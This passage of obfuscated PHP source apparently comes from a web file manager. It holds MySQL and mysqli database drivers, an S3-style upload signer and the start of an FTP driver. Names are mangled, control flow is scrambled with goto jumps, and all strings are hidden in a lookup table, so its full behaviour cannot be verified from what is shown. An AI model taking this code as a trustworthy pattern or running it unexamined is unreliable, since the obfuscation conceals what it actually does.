($fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[793]] ? "\x3a{$fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[793]]}" : $cÇ‹¨Ì¨Ã˜[33]); $EÊÔ¥¬¬¿é = !empty($fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[13]][$cÇ‹¨Ì¨Ã˜[14]]) ? $fÓ‹¼Ü„êÇ[$cÇ‹¨Ì¨Ã˜[13]][$cÇ‹¨Ì¨Ã˜[14]] : $this->pconnect; goto FÊœ‡øí‘ë; FÀæ‹ÍÜÉÛ: } return $this->linkID[$aÌ™ÇŒ†¦]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($E÷•¢ƒ„¿˜) { goto Cê¹ÖÖÇÙš; Cê¹ÖÖÇÙš: $A´™ˆ‹ºÀ =& $_SERVER[Î¿—”òá]; if (0 === stripos($E÷•¢ƒ„¿˜, $A´™ˆ‹ºÀ[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto B¯È‡‹ŸŠì; EèÎ†¨›¿÷: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto fÌôÊçŒÔ; B¯È‡‹ŸŠì: if (!$this->_linkID) { return !1; } $this->queryStr = $E÷•¢ƒ„¿˜; if ($this->queryID) { $this->free(); } goto aŠ‹Ğ¸—µ; aŠ‹Ğ¸—µ: think_action_status($A´™ˆ‹ºÀ[19], 1); think_status($A´™ˆ‹ºÀ[20]); $this->queryID = mysql_query($E÷•¢ƒ„¿˜, $this->_linkID); goto EèÎ†¨›¿÷; fÌôÊçŒÔ: } public function execute($dÉíÃ«·åà) { goto A°ÏÀâŸ†Œ; B¤Â¼œÁÃ¶: if (!1 === $CôàŞ³Œñ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto fÂ›”¤‡Õ©; d”ë¤§òê™: think_status($E×¥Š„²¹È[20]); $CôàŞ³Œñ = mysql_query($dÉíÃ«·åà, $this->_linkID); $this->debug(); goto B¤Â¼œÁÃ¶; aÊƒÄãîÄ×: $this->queryStr = $dÉíÃ«·åà; if ($this->queryID) { $this->free(); } think_action_status($E×¥Š„²¹È[21], 1); goto d”ë¤§òê™; A°ÏÀâŸ†Œ: $E×¥Š„²¹È =& $_SERVER[Î¿—”òá]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aÊƒÄãîÄ×; fÂ›”¤‡Õ©: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Î¿—”òá][800], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f²ğ‚ªÒÂ = mysql_query($_SERVER[Î¿—”òá][801], $this->_linkID); $this->transTimes = 0; if (!$f²ğ‚ªÒÂ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÇ¢Êê™Ã× = mysql_query($_SERVER[Î¿—”òá][802], $this->_linkID); $this->transTimes = 0; if (!$eÇ¢Êê™Ã×) { $this->error(); return !1; } } return !0; } private function getAll() { $E‚…§ã£² = array(); if ($this->numRows > 0) { while ($FÕƒ„íê¶› = mysql_fetch_assoc($this->queryID)) { $E‚…§ã£²[] = $FÕƒ„íê¶›; } mysql_data_seek($this->queryID, 0); } return $E‚…§ã£²; } public function getFields($FÎ¯˜á¨ñ‡) { $cÕååÊ”ã =& $_SERVER[Î¿—”òá]; $BšÏš–¢·õ = $this->query($cÕååÊ”ã[803] . $this->parseKey($FÎ¯˜á¨ñ‡)); $f‰çÍè“¿ƒ = array(); if ($BšÏš–¢·õ) { foreach ($BšÏš–¢·õ as $F„¡¹ê–Ú => $A‹§İ´§ÖÕ) { $f‰çÍè“¿ƒ[$A‹§İ´§ÖÕ[$cÕååÊ”ã[27]]] = array($cÕååÊ”ã[28] => $A‹§İ´§ÖÕ[$cÕååÊ”ã[27]], $cÕååÊ”ã[29] => $A‹§İ´§ÖÕ[$cÕååÊ”ã[30]], $cÕååÊ”ã[31] => (bool) (strtoupper($A‹§İ´§ÖÕ[$cÕååÊ”ã[32]]) === $cÕååÊ”ã[804]), $cÕååÊ”ã[34] => $A‹§İ´§ÖÕ[$cÕååÊ”ã[35]], $cÕååÊ”ã[36] => strtolower($A‹§İ´§ÖÕ[$cÕååÊ”ã[37]]) == $cÕååÊ”ã[38], $cÕååÊ”ã[39] => strtolower($A‹§İ´§ÖÕ[$cÕååÊ”ã[40]]) == $cÕååÊ”ã[41]); } } return $f‰çÍè“¿ƒ; } public function getTables($eÕ å–ªè = '') { $B„ãØê¥¾³ =& $_SERVER[Î¿—”òá]; if (!empty($eÕ å–ªè)) { $b‘Ñ˜ÉİÀ‹ = $B„ãØê¥¾³[805] . $eÕ å–ªè; } else { $b‘Ñ˜ÉİÀ‹ = $B„ãØê¥¾³[806]; } $bø’Àí†˜ğ = $this->query($b‘Ñ˜ÉİÀ‹); $f°Ç“–”‘Õ = array(); foreach ($bø’Àí†˜ğ as $CÒã¼Ú‘å¦ => $e«‘á°ƒ ›) { $f°Ç“–”‘Õ[$CÒã¼Ú‘å¦] = current($e«‘á°ƒ ›); } return $f°Ç“–”‘Õ; } public function replace($a‹Ğ‚¹õ, $BŠËòñåå’ = array()) { $C‘ÊŸ“É® =& $_SERVER[Î¿—”òá]; foreach ($a‹Ğ‚¹õ as $EæàîˆŸÍ¢ => $EŒ§àñ†ÃÊ) { $aÓœÍİÁğ = $this->parseValue($EŒ§àñ†ÃÊ); if (is_scalar($aÓœÍİÁğ)) { $d†÷¶õ˜¶[] = $aÓœÍİÁğ; $e¡àíÈ•Ìø[] = $this->parseKey($EæàîˆŸÍ¢); } } $C‚á­×¥ï = $C‘ÊŸ“É®[807] . $this->parseTable($BŠËòñåå’[$C‘ÊŸ“É®[267]]) . $C‘ÊŸ“É®[808] . implode($C‘ÊŸ“É®[47], $e¡àíÈ•Ìø) . $C‘ÊŸ“É®[809] . implode($C‘ÊŸ“É®[47], $d†÷¶õ˜¶) . $C‘ÊŸ“É®[810]; return $this->execute($C‚á­×¥ï); } public function insertAll($D–³í“¡, $AÁßğÙâà– = array(), $FÆ¯İ½é£ = false) { goto bƒÄ¯¶¡Š; DÃØõ½ã‰ä: $EØÛ¤©¾ô = ($FÆ¯İ½é£ ? $aÕìÁÉÄ™‚[812] : $aÕìÁÉÄ™‚[813]) . $aÕìÁÉÄ™‚[814] . $this->parseTable($AÁßğÙâà–[$aÕìÁÉÄ™‚[267]]) . $aÕìÁÉÄ™‚[808] . implode($aÕìÁÉÄ™‚[47], $eÃìñé¦Ó—) . $aÕìÁÉÄ™‚[815] . implode($aÕìÁÉÄ™‚[47], $dŒ£ÎÉ¸ç); return $this->execute($EØÛ¤©¾ô); goto bÙà£ˆ™š; bƒÄ¯¶¡Š: $aÕìÁÉÄ™‚ =& $_SERVER[Î¿—”òá]; if (!is_array($D–³í“¡[0])) { return !1; } $eÃìñé¦Ó— = array_keys($D–³í“¡[0]); goto Dá¾—³˜ƒˆ; Dá¾—³˜ƒˆ: $dŒ£ÎÉ¸ç = array(); foreach ($D–³í“¡ as $bÏ‡Úº‰¼) { $CœñÅÑËêÖ = array(); foreach ($bÏ‡Úº‰¼ as $fÊáò³ÚÏ— => $bäˆÊ†ª‘) { $bäˆÊ†ª‘ = $this->parseValue($bäˆÊ†ª‘); if (is_scalar($bäˆÊ†ª‘)) { $CœñÅÑËêÖ[] = $bäˆÊ†ª‘; } } $dŒ£ÎÉ¸ç[] = $aÕìÁÉÄ™‚[248] . implode($aÕìÁÉÄ™‚[47], $CœñÅÑËêÖ) . $aÕìÁÉÄ™‚[810]; } array_walk($eÃìñé¦Ó—, array($this, $aÕìÁÉÄ™‚[811])); goto DÃØõ½ã‰ä; bÙà£ˆ™š: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Fƒ˜Şùó =& $_SERVER[Î¿—”òá]; $this->error = mysql_errno() . $Fƒ˜Şùó[4] . mysql_error($this->_linkID); if ($Fƒ˜Şùó[33] != $this->queryStr) { $this->error .= LNG($Fƒ˜Şùó[45]) . $this->queryStr; } think_trace($this->error, $Fƒ˜Şùó[33], $Fƒ˜Şùó[46]); return $this->error; } public function escapeString($EˆÑ¨‹Ìæ¥) { if ($this->_linkID) { return mysql_real_escape_string($EˆÑ¨‹Ìæ¥, $this->_linkID); } else { return mysql_escape_string($EˆÑ¨‹Ìæ¥); } } public function parseKey(&$Cº§§¾Æ±†, $D¾¦É±áÓã = true) { $d•ŒÄ‡™¢Ö =& $_SERVER[Î¿—”òá]; if ($D¾¦É±áÓã) { $Cº§§¾Æ±† = $this->parseKeyCheck($Cº§§¾Æ±†); } if ($Cº§§¾Æ±† != $d•ŒÄ‡™¢Ö[176] && !preg_match($d•ŒÄ‡™¢Ö[816], $Cº§§¾Æ±†)) { $Cº§§¾Æ±† = $d•ŒÄ‡™¢Ö[817] . trim($Cº§§¾Æ±†, $d•ŒÄ‡™¢Ö[817]) . $d•ŒÄ‡™¢Ö[817]; } return $Cº§§¾Æ±†; } } class DbMysqli extends Db { public function __construct($D¹¼·‡¤Ò = '') { $E‰»ÉºòÙÁ =& $_SERVER[Î¿—”òá]; if (!extension_loaded($E‰»ÉºòÙÁ[723])) { think_exception(think_lang($E‰»ÉºòÙÁ[10]) . $E‰»ÉºòÙÁ[818]); } if (!empty($D¹¼·‡¤Ò)) { $this->config = $D¹¼·‡¤Ò; if (empty($this->config[$E‰»ÉºòÙÁ[13]])) { $this->config[$E‰»ÉºòÙÁ[13]] = $E‰»ÉºòÙÁ[33]; } } } public function connect($bÆ¯Š‚…¿ = '', $aÎËˆæƒ = 0) { $A›ª‚«‘Šß =& $_SERVER[Î¿—”òá]; if (!isset($this->linkID[$aÎËˆæƒ])) { goto AÂ¥¶ŸÊ–; D²ãÚ½Æ ¶: $eƒñ¬¹ÌÑ = $this->linkID[$aÎËˆæƒ]->server_version; $this->linkID[$aÎËˆæƒ]->query($A›ª‚«‘Šß[796] . think_config($A›ª‚«‘Šß[797]) . $A›ª‚«‘Šß[55]); if ($eƒñ¬¹ÌÑ > $A›ª‚«‘Šß[798]) { $this->linkID[$aÎËˆæƒ]->query($A›ª‚«‘Šß[799]); } goto Ağ­Ü•Ûöã; Ağ­Ü•Ûöã: $this->connected = !0; if (1 != think_config($A›ª‚«‘Šß[18])) { unset($this->config); } goto B¦´ô¬Ì¾ò; AÂ¥¶ŸÊ–: if (empty($bÆ¯Š‚…¿)) { $bÆ¯Š‚…¿ = $this->config; } $this->linkID[$aÎËˆæƒ] = new mysqli($bÆ¯Š‚…¿[$A›ª‚«‘Šß[792]], $bÆ¯Š‚…¿[$A›ª‚«‘Šß[794]], $bÆ¯Š‚…¿[$A›ª‚«‘Šß[795]], $bÆ¯Š‚…¿[$A›ª‚«‘Šß[17]], $bÆ¯Š‚…¿[$A›ª‚«‘Šß[793]] ? intval($bÆ¯Š‚…¿[$A›ª‚«‘Šß[793]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto D²ãÚ½Æ ¶; B¦´ô¬Ì¾ò: } return $this->linkID[$aÎËˆæƒ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bá™ÈÓô¿) { goto aÜ—¬Ù‘Í; aò¬Ÿ¸Æƒ†: $this->queryStr = $bá™ÈÓô¿; if ($this->queryID) { $this->free(); } think_action_status($dë½Ù±‚¹[19], 1); goto e·¡‚‹®ÕŠ; e·¡‚‹®ÕŠ: think_status($dë½Ù±‚¹[20]); $this->queryID = $this->_linkID->query($bá™ÈÓô¿); if ($this->_linkID->more_results()) { while (($AàÔ ÙÌ = $this->_linkID->next_result()) != NULL) { $AàÔ ÙÌ->free_result(); } } goto dñÊÍ’Çæ¢; aÜ—¬Ù‘Í: $dë½Ù±‚¹ =& $_SERVER[Î¿—”òá]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aò¬Ÿ¸Æƒ†; dñÊÍ’Çæ¢: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto BøÉÒ„Û•¨; BøÉÒ„Û•¨: } public function execute($Fğ“¨å´¬†) { goto E„×Ì·ÍË‡; E„×Ì·ÍË‡: $Bòš­•—À« =& $_SERVER[Î¿—”òá]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AöíÎìÕè; FôÇ¶î¦åç: if (!1 === $EòìĞŸöÏ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto dªËÖßè¯Ù; f«ÇŞ—¢Û‚: think_status($Bòš­•—À«[20]); $EòìĞŸöÏ = $this->_linkID->query($Fğ“¨å´¬†); $this->debug(); goto FôÇ¶î¦åç; AöíÎìÕè: $this->queryStr = $Fğ“¨å´¬†; if ($this->queryID) { $this->free(); } think_action_status($Bòš­•—À«[21], 1); goto f«ÇŞ—¢Û‚; dªËÖßè¯Ù: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B•Æ—ËÜ° = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$B•Æ—ËÜ°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F·÷ƒ¥È«Ô = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F·÷ƒ¥È«Ô) { $this->error(); return !1; } } return !0; } private function getAll() { $eç½È‹î­® = array(); if ($this->numRows > 0) { for ($F·÷¼Ì×‰¨ = 0; $F·÷¼Ì×‰¨ < $this->numRows; $F·÷¼Ì×‰¨++) { $eç½È‹î­®[$F·÷¼Ì×‰¨] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $eç½È‹î­®; } public function getFields($EŠÍšÏ¥‹¯) { $Eƒƒä¬àÀÌ =& $_SERVER[Î¿—”òá]; $AôíİŞÕçâ = $this->query($Eƒƒä¬àÀÌ[803] . $this->parseKey($EŠÍšÏ¥‹¯)); $a†™·åÎˆò = array(); if ($AôíİŞÕçâ) { foreach ($AôíİŞÕçâ as $D˜•µİŒº => $cÔ¿ó™©) { $a†™·åÎˆò[$cÔ¿ó™©[$Eƒƒä¬àÀÌ[27]]] = array($Eƒƒä¬àÀÌ[28] => $cÔ¿ó™©[$Eƒƒä¬àÀÌ[27]], $Eƒƒä¬àÀÌ[29] => $cÔ¿ó™©[$Eƒƒä¬àÀÌ[30]], $Eƒƒä¬àÀÌ[31] => (bool) ($cÔ¿ó™©[$Eƒƒä¬àÀÌ[32]] === $Eƒƒä¬àÀÌ[33]), $Eƒƒä¬àÀÌ[34] => $cÔ¿ó™©[$Eƒƒä¬àÀÌ[35]], $Eƒƒä¬àÀÌ[36] => strtolower($cÔ¿ó™©[$Eƒƒä¬àÀÌ[37]]) == $Eƒƒä¬àÀÌ[38], $Eƒƒä¬àÀÌ[39] => strtolower($cÔ¿ó™©[$Eƒƒä¬àÀÌ[40]]) == $Eƒƒä¬àÀÌ[41]); } } return $a†™·åÎˆò; } public function getTables($c®ã”ß¡‡ = '') { $CÇÕ¯À ÙŒ =& $_SERVER[Î¿—”òá]; $CöñÔ†ÕÜÇ = !empty($c®ã”ß¡‡) ? $CÇÕ¯À ÙŒ[805] . $c®ã”ß¡‡ : $CÇÕ¯À ÙŒ[806]; $FŒ¤Ú‰ß• = $this->query($CöñÔ†ÕÜÇ); $BÑÄÄæÖ©É = array(); if ($FŒ¤Ú‰ß•) { foreach ($FŒ¤Ú‰ß• as $cÎ—ğŒ–˜ => $dŒ¦æ˜Ÿ‰¼) { $BÑÄÄæÖ©É[$cÎ—ğŒ–˜] = current($dŒ¦æ˜Ÿ‰¼); } } return $BÑÄÄæÖ©É; } public function replace($Bèä²Á›, $FØê¸Éê°é = array()) { $d–ì‘ºŒ¹Ç =& $_SERVER[Î¿—”òá]; foreach ($Bèä²Á› as $aÒßò¾ˆœá => $a¥Èæğ¬Ñí) { $aÈÛÒ°ĞÇä = $this->parseValue($a¥Èæğ¬Ñí); if (is_scalar($aÈÛÒ°ĞÇä)) { $eñã‡ÓÀ‘[] = $aÈÛÒ°ĞÇä; $bÙ¨¬…¸Í[] = $this->parseKey($aÒßò¾ˆœá); } } $EÔÃÅºĞó = $d–ì‘ºŒ¹Ç[807] . $this->parseTable($FØê¸Éê°é[$d–ì‘ºŒ¹Ç[267]]) . $d–ì‘ºŒ¹Ç[808] . implode($d–ì‘ºŒ¹Ç[47], $bÙ¨¬…¸Í) . $d–ì‘ºŒ¹Ç[809] . implode($d–ì‘ºŒ¹Ç[47], $eñã‡ÓÀ‘) . $d–ì‘ºŒ¹Ç[810]; return $this->execute($EÔÃÅºĞó); } public function insertAll($C²ÕÅèøçˆ, $c«“Äç¦î¶ = array(), $AšÙÆ²›½Æ = false) { goto D‰Á÷Ô‰Íë; D‰Á÷Ô‰Íë: $c›¯£²Ã²¨ =& $_SERVER[Î¿—”òá]; if (!is_array($C²ÕÅèøçˆ[0])) { return !1; } $có†Å—¼İÁ = array_keys($C²ÕÅèøçˆ[0]); goto DåÄ…ÀŞ±; b„êƒÕºÍ…: $E†‹¹´â¡ = ($AšÙÆ²›½Æ ? $c›¯£²Ã²¨[812] : $c›¯£²Ã²¨[813]) . $c›¯£²Ã²¨[814] . $this->parseTable($c«“Äç¦î¶[$c›¯£²Ã²¨[267]]) . $c›¯£²Ã²¨[808] . implode($c›¯£²Ã²¨[47], $có†Å—¼İÁ) . $c›¯£²Ã²¨[815] . implode($c›¯£²Ã²¨[47], $D–ò¤â–Ù‹); return $this->execute($E†‹¹´â¡); goto DÄ—èùÁ¯Â; DåÄ…ÀŞ±: $D–ò¤â–Ù‹ = array(); foreach ($C²ÕÅèøçˆ as $Fƒ…çŞôÑÕ) { $D½³Şº°Ş = array(); foreach ($Fƒ…çŞôÑÕ as $F¬¸ê×ÊÌ => $dæé²î‰ì°) { $dæé²î‰ì° = $this->parseValue($dæé²î‰ì°); if (is_scalar($dæé²î‰ì°)) { $D½³Şº°Ş[] = $dæé²î‰ì°; } } $D–ò¤â–Ù‹[] = $c›¯£²Ã²¨[248] . implode($c›¯£²Ã²¨[47], $D½³Şº°Ş) . $c›¯£²Ã²¨[810]; } array_walk($có†Å—¼İÁ, array($this, $c›¯£²Ã²¨[811])); goto b„êƒÕºÍ…; DÄ—èùÁ¯Â: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F¼´¶¬”ÆŠ =& $_SERVER[Î¿—”òá]; $this->error = $this->_linkID->errno . $F¼´¶¬”ÆŠ[4] . $this->_linkID->error; if ($F¼´¶¬”ÆŠ[33] != $this->queryStr) { $this->error .= LNG($F¼´¶¬”ÆŠ[45]) . $this->queryStr; } think_trace($this->error, $F¼´¶¬”ÆŠ[33], $F¼´¶¬”ÆŠ[46]); return $this->error; } public function escapeString($AÓ‘©½Ç¦ó) { if ($this->_linkID) { return $this->_linkID->real_escape_string($AÓ‘©½Ç¦ó); } else { return addslashes($AÓ‘©½Ç¦ó); } } public function parseKey(&$Cíé‡èæ, $e­Ü¯Ò°ä = true) { $b×é»õÇÂ‘ =& $_SERVER[Î¿—”òá]; if ($e­Ü¯Ò°ä) { $Cíé‡èæ = $this->parseKeyCheck($Cíé‡èæ); } if ($Cíé‡èæ != $b×é»õÇÂ‘[176] && !preg_match($b×é»õÇÂ‘[816], $Cíé‡èæ)) { $Cíé‡èæ = $b×é»õÇÂ‘[817] . trim($Cíé‡èæ, $b×é»õÇÂ‘[817]) . $b×é»õÇÂ‘[817]; } return $Cíé‡èæ; } } goto DòÔ»ßæ; DÃã‡¨Şºõ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Fé¤‘²Êˆà) { parent::__construct($Fé¤‘²Êˆà); $this->signatureVersion($_SERVER[Î¿—”òá][200]); } public function uploadFormData($c¢˜Èºøé©, $EÏ‡‰Èğ›‡ = 3600) { goto bäî¶âÒ; C³Óµ ¼¥Ú: $aò¬‚±Ë = base64_encode(json_encode($F‰“ßÑ±ˆÉ)); $Dé»ÚÀã“… = hash_hmac($A­ÑÜŠ†ö÷[1137], $e›ã–†÷õ, $A­ÑÜŠ†ö÷[1138] . $this->secret, !0); $FÅ´ê¨îæ = hash_hmac($A­ÑÜŠ†ö÷[1137], $this->region, $Dé»ÚÀã“…, !0); goto e¨µ–ñòâë; bäî¶âÒ: $A­ÑÜŠ†ö÷ =& $_SERVER[Î¿—”òá]; $dµ™øÈ¼‹Ã = $A­ÑÜŠ†ö÷[185]; $d‹ôµˆù×À = $A­ÑÜŠ†ö÷[1127]; goto Eó‹§Äâ›; AñóÕé±•Ÿ: $C’µ–ìº¤İ = array($A­ÑÜŠ†ö÷[199] => $A­ÑÜŠ†ö÷[33], $A­ÑÜŠ†ö÷[1139] => $A­ÑÜŠ†ö÷[33], $A­ÑÜŠ†ö÷[1097] => $dµ™øÈ¼‹Ã, $A­ÑÜŠ†ö÷[1101] => $FñëÓŸ¸ô, $A­ÑÜŠ†ö÷[1105] => $aò¬‚±Ë, $A­ÑÜŠ†ö÷[1140] => $e¶ßàÁÁİÁ, $A­ÑÜŠ†ö÷[1141] => $d‹ôµˆù×À, $A­ÑÜŠ†ö÷[1142] => $AÑ¡äÀÀÙ, $A­ÑÜŠ†ö÷[1143] => $cÖæø¿½Àå, $A­ÑÜŠ†ö÷[1144] => $b‘ù™¦ÆöÚ, $A­ÑÜŠ†ö÷[169] => $this->getHost()); return $C’µ–ìº¤İ; goto C•ª±‡‹É; A·¶Øº‰¾‘: $d›“¨è²’ó = array($this->accessKey, $e›ã–†÷õ, $this->region, $CÇ¨Ä„¯…¥, $F¾‚¯¯ê­Ş); $e¶ßàÁÁİÁ = implode($A­ÑÜŠ†ö÷[8], $d›“¨è²’ó); $F‰“ßÑ±ˆÉ = array($A­ÑÜŠ†ö÷[1095] => gmdate($A­ÑÜŠ†ö÷[1094], strtotime($A­ÑÜŠ†ö÷[1130])), $A­ÑÜŠ†ö÷[1096] => array(array($A­ÑÜŠ†ö÷[1098] => $this->bucket), array($A­ÑÜŠ†ö÷[1097] => $dµ™øÈ¼‹Ã), array($A­ÑÜŠ†ö÷[1099], $A­ÑÜŠ†ö÷[1100], $A­ÑÜŠ†ö÷[33]), array($A­ÑÜŠ†ö÷[1099], $A­ÑÜŠ†ö÷[1131], $A­ÑÜŠ†ö÷[33]), array($A­ÑÜŠ†ö÷[1099], $A­ÑÜŠ†ö÷[1132], $A­ÑÜŠ†ö÷[33]), array($A­ÑÜŠ†ö÷[1101] => $FñëÓŸ¸ô), array($A­ÑÜŠ†ö÷[1133] => $e¶ßàÁÁİÁ), array($A­ÑÜŠ†ö÷[1134] => $d‹ôµˆù×À), array($A­ÑÜŠ†ö÷[1135] => $AÑ¡äÀÀÙ), array($A­ÑÜŠ†ö÷[1136] => $cÖæø¿½Àå))); goto C³Óµ ¼¥Ú; e¨µ–ñòâë: $fïËÔïÙÛÃ = hash_hmac($A­ÑÜŠ†ö÷[1137], $CÇ¨Ä„¯…¥, $FÅ´ê¨îæ, !0); $f¨ğóÖ­…‚ = hash_hmac($A­ÑÜŠ†ö÷[1137], $F¾‚¯¯ê­Ş, $fïËÔïÙÛÃ, !0); $b‘ù™¦ÆöÚ = hash_hmac($A­ÑÜŠ†ö÷[1137], $aò¬‚±Ë, $f¨ğóÖ­…‚); goto AñóÕé±•Ÿ; Eó‹§Äâ›: $CÇ¨Ä„¯…¥ = $A­ÑÜŠ†ö÷[59]; $AÑ¡äÀÀÙ = gmdate($A­ÑÜŠ†ö÷[1128]); $e›ã–†÷õ = gmdate($A­ÑÜŠ†ö÷[686]); goto D¶¥¯±§•; D¶¥¯±§•: $F¾‚¯¯ê­Ş = $A­ÑÜŠ†ö÷[1129]; $cÖæø¿½Àå = $EÏ‡‰Èğ›‡ . $A­ÑÜŠ†ö÷[33]; $FñëÓŸ¸ô = $A­ÑÜŠ†ö÷[1093]; goto A·¶Øº‰¾‘; C•ª±‡‹É: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Dæ©œ¿) { parent::__construct(); if (count($Dæ©œ¿) > 0) { $this->_init($Dæ©œ¿); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($dÊÓàŸó…) { $EØ‹Ü’ä‚È =& $_SERVER[Î¿—”òá]; global $config; $this->appCharset = $config[$EØ‹Ü’ä‚È[1145]]; $this->systemCharset = $config[$EØ‹Ü’ä‚È[1146]]; if (isset($dÊÓàŸó…[$EØ‹Ü’ä‚È[1147]]) && $dÊÓàŸó…[$EØ‹Ü’ä‚È[1147]]) { $this->systemCharset = $dÊÓàŸó…[$EØ‹Ü’ä‚È[1147]]; } } public function iconvApp($D‡¿ÏˆéÑ) { return $this->iconvTo($D‡¿ÏˆéÑ, $this->systemCharset, $this->appCharset); } public function iconvSystem($C÷Â©˜‡º¼) { return $this->iconvTo($C÷Â©˜‡º¼, $this->appCharset, $this->systemCharset); } public function getPathOuter($A‘³Ééó¶¨) { goto cÉÕ¹ã½æ; C¨äàà¨ã¬: $A‘³Ééó¶¨ = KodIO::clear($A‘³Ééó¶¨); $A‘³Ééó¶¨ = substr($A‘³Ééó¶¨, strlen($bĞ´˜„Œµù)); if (empty($this->pathDriver)) { return $A‘³Ééó¶¨; } goto a¬‰‡öè²¬; a¬‰‡öè²¬: return $this->pathDriver . $AÒÑÁîãˆŸ[8] . ltrim($A‘³Ééó¶¨, $AÒÑÁîãˆŸ[8]); goto A–‘™‘Çİ; cÉÕ¹ã½æ: $AÒÑÁîãˆŸ =& $_SERVER[Î¿—”òá]; $bĞ´˜„Œµù = $this->iconvApp($this->pathBase); $A‘³Ééó¶¨ = $this->iconvApp($A‘³Ééó¶¨); goto cˆƒº¨ê‹å; cˆƒº¨ê‹å: if (substr($bĞ´˜„Œµù, 0, 2) == $AÒÑÁîãˆŸ[1148]) { $bĞ´˜„Œµù = BASIC_PATH . substr($bĞ´˜„Œµù, 2); } if (substr($A‘³Ééó¶¨, 0, 2) == $AÒÑÁîãˆŸ[1148]) { $A‘³Ééó¶¨ = BASIC_PATH . substr($A‘³Ééó¶¨, 2); } $bĞ´˜„Œµù = KodIO::clear($bĞ´˜„Œµù); goto C¨äàà¨ã¬; A–‘™‘Çİ: } private function _init($BŠ–ø•Õ® = array()) { $aò¥§†½¨  =& $_SERVER[Î¿—”òá]; if (!function_exists($aò¥§†½¨ [1149])) { show_json(LNG($aò¥§†½¨ [1150]), !1); } $this->config = $BŠ–ø•Õ®; $this->charsetReset($BŠ–ø•Õ®); foreach ($BŠ–ø•Õ® as $CÀæÂœ‚öŒ => $fÛÓ­Ã£©) { if (isset($this->{$CÀæÂœ‚öŒ})) { $this->{$CÀæÂœ‚öŒ} = $fÛÓ­Ã£©; } } return $this->_login($BŠ–ø•Õ®); } private function _login($DÍ¸¨‚ƒÏñ) { goto C—ÇˆØÁ•; cÍ‡ÇÂãŠ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $DéÚâõ¢Ìì = $this->pasv == $CÂòõ½¾›[83] ? !0 : !1; @ftp_pasv($this->connect, $DéÚâõ¢Ìì); goto BùœÏÎ·²»; b¹î¿Œã: if (isset($eÛ‘ÛŠÜÈ[$c™šİ—à»Ó])) { foreach ($eÛ‘ÛŠÜÈ[$c™šİ—à»Ó] as $a…„”Æ´¿È => $Fİ ÍŞ›¬›) { $this->{$a…„”Æ´¿È} = $Fİ ÍŞ›¬›; } return !0; } $cÜ©ìğµ¿Š = parse_url(trim($this->server, $CÂòõ½¾›[8])); $this->host = $cÜ©ìğµ¿Š[$CÂòõ½¾›[169]]; goto C×ëÚÃ²¥Ã; C×ëÚÃ²¥Ã: $fÖÁ¶¤àİº = isset($cÜ©ìğµ¿Š[$CÂòõ½¾›[168]]) && $cÜ©ìğµ¿Š[$CÂòõ½¾›[168]] == $CÂòõ½¾›[1151] ? !0 : !1; $this->scheme = $fÖÁ¶¤àİº ? $CÂòõ½¾›[1152] : $CÂòõ½¾›[1153]; $this->port = isset($cÜ©ìğµ¿Š[$CÂòõ½¾›[170]]) ? $cÜ©ìğµ¿Š[$CÂòõ½¾›[170]] : 21; goto FœöÜÆ†ß; FœöÜÆ†ß: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $F×Ó¦Œ°Ú = @ftp_login($this->connect, $this->username, $this->userpass); goto cÍ‡ÇÂãŠ; C—ÇˆØÁ•: $CÂòõ½¾› =& $_SERVER[Î¿—”òá]; static $eÛ‘ÛŠÜÈ = array(); $c™šİ—à»Ó = md5(json_encode($DÍ¸¨‚ƒÏñ)); goto b¹î¿Œã; BùœÏÎ·²»: $eÛ‘ÛŠÜÈ[$c™šİ—à»Ó] = array($CÂòõ½¾›[1154] => $this->connect, $CÂòõ½¾›[169] => $this->host, $CÂòõ½¾›[168] => $this->scheme, $CÂòõ½¾›[170] => $this->port); return $F×Ó¦Œ°Ú; goto d«êÛõ†ª¢; d«êÛõ†ª¢: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($c¹‚ØõÒ, $d¡‰ÅõõÏˆ = '', $AéßØÎ·ùŞ = REPEAT_RENAME) { if 